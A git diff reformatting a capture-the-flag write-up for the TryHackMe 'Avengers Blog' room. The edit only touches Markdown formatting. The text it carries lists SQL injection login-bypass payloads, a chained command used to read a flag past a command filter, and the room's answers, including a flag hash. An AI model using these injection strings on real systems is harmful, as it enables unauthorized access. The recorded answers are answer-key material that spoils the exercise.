@@ -60,27 +60,27 @@ Look around the FTP share and read flag 3!
     - One interesting result: /portal (Status: 200)
     - Let's try this
 - Picture: [Avengers_Blog_7.png](https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_7.png)
-- ** Answers ** : /portal
+- **Answers** : /portal
 ---------------------------
 ### Task 6 - SQL Injection
 -  Log into the Avengers site. View the page source, how many lines of code are there?
     - Based on the indication from TryHackMe, the portal is vulnerable to SQL injection. Before to try automatic tool such as BurpSuite, let's try some basic SQL Injection
-    >' or "
-    >-- or #
-    >' OR '1
-    >' OR 1 -- -
-    >" OR "" = "
-    >" OR 1 = 1 -- -
-    >' OR '' = '
-    >' OR 1 = 1 --   (correct pattern)
+    >' or "<br>
+    >-- or #<br>
+    >' OR '1<br>
+    >' OR 1 -- -<br>
+    >" OR "" = "<br>
+    >" OR 1 = 1 -- -<br>
+    >' OR '' = '<br>
+    >' OR 1 = 1 --   (correct pattern)<br>
     - Picture: [Avengers_Blog_8.png](https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_8.png)
     - Check the source page
-    - ** Answers ** : 223
+    - **Answers** : 223
 ---------------------------
 ### Task 7 - Remote code execurtion and linux
 - Read the contents of flag5.txt
 - Some command are authorize but not all. For example : ls , cd
     - cd ..;ls;tac flag5.txt
 - Picture: [Avengers_Blog_9.png](https://github.com/LNB283/THM/blob/main/EASY/Avengers%20Blog/Pictures/Avengers_Blog_9.png)
-- ** Answers ** : d335e2d13f36558ba1e67969a1718af7
+- **Answers** : d335e2d13f36558ba1e67969a1718af7
 
